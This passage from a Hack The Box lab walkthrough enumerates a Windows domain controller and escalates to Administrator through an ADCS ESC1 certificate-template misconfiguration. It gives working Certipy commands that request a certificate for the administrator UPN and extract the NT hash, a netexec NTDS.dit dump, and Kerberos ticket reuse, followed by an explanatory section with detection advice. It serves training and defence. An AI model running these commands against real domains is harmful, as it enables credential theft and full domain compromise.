    SQL Server 2019 Database Engine Shared                             15.0.2000.5
    SQL Server 2019 Database Engine Services                           15.0.2000.5
    Microsoft Visual C++ 2019 X64 Additional Runtime - 14.29.30133     14.29.30133
    SQL Server 2019 DMF                                                15.0.2000.5
    SQL Server 2019 Connection Info                                    15.0.2000.5


    Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.29.30133 14.29.30133.0
    Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.29.30133 14.29.30133.0
    Microsoft Visual C++ 2019 X86 Additional Runtime - 14.29.30133     14.29.30133
    Browser for SQL Server 2019                                        15.0.2000.5
    Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664         12.0.40664
    Microsoft Visual C++ 2013 Redistributable (x86) - 12.0.40664       12.0.40664.0
    Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664      12.0.40664
    Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.29.30133        14.29.30133

    ```
-   The only thing that looks interesting here is the VMWare install, however that could just be for the box to run.


#### Path Enumeration: {#path-enumeration}

-   **I enumerate the** `PATH`:
    -   `$Env:PATH`
        -   I see that there is an installation of `OpenSSH` here:
            -   {{< figure src="/ox-hugo/2024-10-04-213528_.png" >}}


#### Drive Enumeration: {#drive-enumeration}

-   **I check for any other mounted drives**:
    -   `get-PSdrive`
    -   {{< figure src="/ox-hugo/2024-10-04-213703_.png" >}}
    -   What is interesting here is `Cert`, certificates can be used as a valid attack path.


#### Scheduled Task Enumeration: {#scheduled-task-enumeration}

-   **I check for scheduled tasks**:
    -   `Get-ScheduledTask | select TaskName,State`
    -   {{< figure src="/ox-hugo/2024-10-04-213931_.png" >}}
    -   It is denied, however I can use `schtasks`, save the output and inspect later:
        -   `schtasks /query /fo LIST /v > tasks.txt`
        -   {{< figure src="/ox-hugo/2024-10-04-214202_.png" >}}
        -   This provides ALOT of data, so we need to be smart with how we process it. At the moment I have kept it for later.


#### Powershell History Enumeration: {#powershell-history-enumeration}

-   **I try and check his powershell history file**:
    -   `Cat C:\Users\Ryan.Cooper\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
    -   `Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine" | Format-Table -AutoSize`


#### Network Enumeration: {#network-enumeration}

-   **I check to see if we are listening or presenting any interesting services**:
    -   `netstat -nao`
    -   {{< figure src="/ox-hugo/2024-10-05-132616_.png" >}}

-   **Arp Table Enumeration**:
    -   `arp -a`
    -   {{< figure src="/ox-hugo/2024-10-05-133159_.png" >}}
    -   There are some other hosts listed here, however as far as I am aware this is the only target for this engagement as it's a single box, unless we are presenting different services on different nics &amp; they have seperate IP's.

-   **NIC enumeration**:
    -   `ipconfig /all`
    -   {{< figure src="/ox-hugo/2024-10-05-133327_.png" >}}
    -   I check for additional NICS but there is nothing, so the entries in the arp table I imagine are part of HTB's infrastructure.

-   **I check the routing table**:
    -   `route print`
    -   {{< figure src="/ox-hugo/2024-10-05-133517_.png" >}}

-   **I attempt to enumerate network shares but I am denied**:
    -   {{< figure src="/ox-hugo/2024-10-05-133615_.png" >}}

-   **I check for VPN connections**:
    -   `rasdial`
    -   {{< figure src="/ox-hugo/2024-10-05-134610_.png" >}}


#### Service/Process Enumeration: {#service-process-enumeration}

-   **I attempt to list all processes running**:
    -   I try with `tasklist /svc` &amp; with `wmic process list full` but I am denied.
    -   {{< figure src="/ox-hugo/2024-10-05-134800_.png" >}}

-   **I try and enumerate services using powershell**:
    -   `get-service`
    -   {{< figure src="/ox-hugo/2024-10-05-135020_.png" >}}
    -   It fails as I suspect, however we can also check services with `evil-winrm`.

-   **Listing running services using** `evil-winrm`:
    -   {{< figure src="/ox-hugo/2024-10-05-135154_.png" >}}
    -   There are 3 services running with Privs, but 2 are Defender and the other is a standard windows component, so not hijackable as far as I am aware.


#### Enumerating the password policy: {#enumerating-the-password-policy}

-   **Enumerating the password policy**:
    -   `net accounts`
    -   {{< figure src="/ox-hugo/2024-10-05-135455_.png" >}}
    -   Nothing of note


#### Enumerating if the DC is vulnerable to any certificate privilege escalation techniques. {#enumerating-if-the-dc-is-vulnerable-to-any-certificate-privilege-escalation-techniques-dot}

-   **I use** [certipy](https://github.com/ly4k/Certipy) **to check if the DC is vulnerable**:
    -   `certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box`
    -   {{< figure src="/ox-hugo/2024-10-05-141826_.png" >}}

-   **Reading the report it says the DC is vulnerable to the** [ESC1](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1) **attack path**:
    -   {{< figure src="/ox-hugo/2024-10-05-141931_.png" >}}


### Using ESC1 Attack Chain to elevate privileges to Administrator: {#using-esc1-attack-chain-to-elevate-privileges-to-administrator}

1.  **I retrieve the certificate template name from the file**:
    -   {{< figure src="/ox-hugo/2024-10-05-151236_.png" >}}

2.  **I sync my clock**:
    -   `sudo ntpdate -s sequel.htb`
    -   {{< figure src="/ox-hugo/2024-10-05-152616_.png" >}}
        -   +Note+:
            -   If you see the below error this is most likely down to your attack host clock being too out of sync with the target. (Picture taken from a previous box where I learned the hard way)
            -   {{< figure src="/ox-hugo/2024-09-21-201233_.png" >}}

3.  **I request a cert**:
    -   `certipy-ad req -username $user@$domain -password $pass -ca sequel-DC-CA -target ca.$domain -template UserAuthentication -upn administrator@$domain -dns dc.$domain`
        -   {{< figure src="/ox-hugo/2024-10-05-150245_.png" >}}
        -   +Note+: How we have used the name of the certificate we found in step 1 `UserAuthentication`
        -   ~~!!!SUCESS!!!~~

4.  **I request to authenticate as the Administrator and retrieve the Administrator NT hash &amp; creds stored in** `.ccache`:
    -   `certipy-ad auth -pfx administrator_dc.pfx -dc-ip $box`
    -   We have both the administrator hash as well as the creds stored in `.ccache` which we can use Kerberos authentication with.
    -   {{< figure src="/ox-hugo/2024-10-05-150539_.png" >}}


#### Attack Deep-Dive e.g Exploiting UPN's in ESC1 Attacks: A Hackers Guide: {#attack-deep-dive-e-dot-g-exploiting-upn-s-in-esc1-attacks-a-hackers-guide}

-   **What's a UPN and Why Do We Care?**
    -   First things first: `UPN` stands for User Principal Name (UPN). They're commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here's why they're so important:
        1.  They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension.
        2.  They link certificates to specific Active Directory accounts.
        3.  They enable certificate mapping for authentication.
        4.  They facilitate Single Sign-On (SSO) scenarios.
        5.  They're used in smart card logons.
        6.  Sometimes, they even correspond to email addresses.

-   **Now onto the attack**:
    -   ESC1 is one of the most fundamental certificate-based attack vectors in Active Directory environments. It occurs when a certificate template allows for client authentication and is configured with dangerous enrollment permissions. Here's why it matters:
        -   It's incredibly common in enterprise environments
        -   Often overlooked during security assessments
        -   Can lead to complete domain compromise (like in this case)
        -   Relatively simple to execute

-   **The ESC1 Attack: Your Gateway to Domain Admin Privileges**:
    -   The ESC1 attack path revolves around a misconfigured certificate template that grants excessive enrollment permissions. Here's the breakdown:
        1.  We discover a template that allows client authentication (like the User template)
        2.  We notice that low-privileged users (like Domain Users) have enrollment rights
        3.  We request a certificate using this template
        4.  We can now authenticate to services that accept certificate-based authentication

-   **From Certificate to Domain Access**:
    -   But wait, you might ask, "How do we actually leverage this certificate for privilege escalation?" Great question! Here's the step-by-step process:
        -   First, we identify vulnerable templates:
            -   Look for templates that allow client authentication
            -   Check if Domain Users can enroll
            -   Verify the template is enabled

        -   **We request and obtain our certificate**:
            -   Using Certipy
            -   The certificate is valid and trusted within the domain

        -   **Here's where the magic happens**:
            -   We can now authenticate to services that accept certificate auth
            -   +Note+: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a `.cacche` file so we can then perform PTT attacks from the comfort of our attack box.

        -   **Privilege escalation opportunities**:
            -   Authenticate as a the privielged user with their hash.
            -   Authentication to sensitive services
            -   Potential for further certificate template abuse

-   **Why This Attack Vector is Significant**:
    -   **Widespread Impact**: Many organizations use default certificate templates
    -   **Persistence**: Certificates typically have long validity periods
        -   {{< figure src="/ox-hugo/2024-10-05-153645_.png" >}}
        -   This one is valide for 99 years!!!
    -   **Stealth Factor**: Certificate-based authentication generates fewer logs
    -   **Chain Reaction**: Can be combined with other ESC attacks for greater impact

-   **Detection and Prevention**:
    1.  Audit certificate template permissions regularly
    2.  Restrict enrollment rights to necessary users only
    3.  Disable unused certificate templates
    4.  Monitor certificate request patterns
    5.  Implement proper template security settings

-   **Tools of the Trade**:
    -   [Certipy](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1): Your Swiss Army knife for certificate attacks
    -   [Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil): Built-in Windows tool for certificate operations

-   **Remember**: ESC1 might seem basic, but it's often the first step in a more complex attack chain. Don't underestimate its potential impact on your Active Directory security posture!


## 4. Ownership: {#4-dot-ownership}


### Dumping `NTDS.dit` database: {#dumping-ntds-dot-dit-database}

-   **Dumping NTDS for ownership**:
    -   `netexec smb $box -u $user -H $hash -M ntdsutil`
    -   {{< figure src="/ox-hugo/2024-10-05-151008_.png" >}}


### Loading `.ccache` into the `KRB5CCNAME` Variable to Authenticate: {#loading-dot-ccache-into-the-krb5ccname-variable-to-authenticate}

-   **I load the** `.ccache` **into the** `KRB5CCNAME` **Variable**:
    -   {{< figure src="/ox-hugo/2024-10-05-154134_.png" >}}

-   **I check it's valid**:
    -   `netexec smb $box -u administrator --use-kcache --shares`
    -   {{< figure src="/ox-hugo/2024-10-05-154254_.png" >}}
    -   It is, we can now authenticate with kerberos.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I hadn't actually used the ESC1 attack vector before only ESC7 in <https://bloodstiller.com/walkthroughs/manager-box/>, so it was cool to that.
2.  I learned about netexec displaying `guest` when a random username and password is supplied as a way to show that guest logon is accepted on the target.
3.  I learned to always re-check my tools. That mistake with `evil-winrm` was silly.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  See point 3 above.
2.  Oh I also tried to use the wrong certificate name when initially doing the exploit, copy &amp; paste always!


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


